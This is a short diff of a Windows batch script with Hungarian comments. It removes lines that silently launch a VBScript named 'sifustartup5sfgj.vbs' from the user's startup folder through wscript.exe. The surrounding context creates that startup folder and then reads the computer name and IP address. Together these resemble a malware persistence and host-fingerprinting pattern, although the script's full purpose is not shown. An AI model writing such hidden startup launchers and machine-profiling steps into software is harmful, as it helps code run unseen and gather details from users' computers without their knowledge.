@@ -17,11 +17,6 @@ if not exist "%STARTUP_FOLDER%" (
     mkdir "%STARTUP_FOLDER%"
 )
 
-:: ====== VBSCRIPT FUTTATÁSA LÁTHATATLANUL ======
-echo [INFO] A sifustartup5sfgj.vbs inditasa...
-start "" "wscript.exe" "%STARTUP_FOLDER%\sifustartup5sfgj.vbs"
-echo [SIKER] VBScript elindult (háttérben).
-
 
 :: ====== GÉPNÉV + IP ======
 set "GEPNEV=%COMPUTERNAME%"
